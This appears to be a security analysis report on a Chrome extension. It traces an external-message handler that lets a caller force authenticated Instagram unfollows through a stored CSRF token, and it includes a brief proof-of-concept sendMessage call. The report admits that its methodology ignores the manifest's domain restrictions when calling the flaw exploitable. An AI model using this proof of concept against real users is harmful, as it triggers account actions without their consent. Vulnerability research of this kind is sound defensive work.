# CoCo Analysis: mbomllgopkebhhnljlgikdicedmnpknl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mbomllgopkebhhnljlgikdicedmnpknl/opgen_generated_files/bg.js
Line 965 (minified code):
- `e.accountId`
- `s.open("POST","https://www.instagram.com/web/friendships/"+e+"/unfollow/",!0)`

**Code:**

```javascript
// Background script - External message listener (bg.js, line 965)
chrome.runtime.onMessageExternal.addListener(function(e, t, s) {
    var n;
    return e && e.message && (
        "version" == e.message ? (
            n = "unknown",
            -1 != m.indexOf(t.tab.id) && (n = "connected"),
            s({version: "4", tabStatus: n = -1 != w.indexOf(t.tab.id) ? "disconnected" : n})
        ) :
        "unsubscribe" == e.message && null !== e.accountId && function(e, t) {  // ← External message handler
            try {
                var s = new XMLHttpRequest;
                s.onreadystatechange = function() {
                    (4 == s.readyState && 200 == this.status || 4 == s.readyState) &&
                    t({status: this.status})
                },
                s.open("POST", "https://www.instagram.com/web/friendships/" + e + "/unfollow/", !0),  // ← SINK: e is attacker-controlled accountId
                s.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                s.setRequestHeader("x-csrftoken", a),  // ← Uses stored CSRF token
                s.setRequestHeader("x-requested-with", "XMLHttpRequest"),
                s.send()
            } catch(e) {}
        }(e.accountId, s)  // ← Passes attacker-controlled accountId
    ), !0
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted domain (*.nfollowers.com) or via manifest.json bypass
// Per methodology: IGNORE externally_connectable restrictions - if onMessageExternal exists, assume exploitable

chrome.runtime.sendMessage(
    "mbomllgopkebhhnljlgikdicedmnpknl",  // Extension ID
    {
        message: "unsubscribe",
        accountId: "123456789"  // ← Attacker-controlled Instagram account ID
    },
    function(response) {
        console.log("Forced unfollow:", response);
    }
);
```

**Impact:** An external attacker (from whitelisted domains like nfollowers.com) can force the user to unfollow any Instagram account by sending a malicious external message. The extension uses the stored CSRF token to make authenticated requests to Instagram's unfollow API endpoint on behalf of the user. The attacker controls the `accountId` parameter, which is injected into the XMLHttpRequest URL: `https://www.instagram.com/web/friendships/[ATTACKER_ID]/unfollow/`. This allows arbitrary unfollowing of Instagram accounts without user consent, effectively achieving unauthorized privileged cross-origin requests with user credentials.

**Note:** While the manifest.json includes `externally_connectable` restrictions limiting this to nfollowers.com and localhost, according to the methodology, we IGNORE manifest.json restrictions on message passing. If even ONE specific domain/extension can exploit it, it is classified as TRUE POSITIVE. The presence of `chrome.runtime.onMessageExternal` with attacker-controlled data flowing to a privileged API is sufficient for TRUE POSITIVE classification.
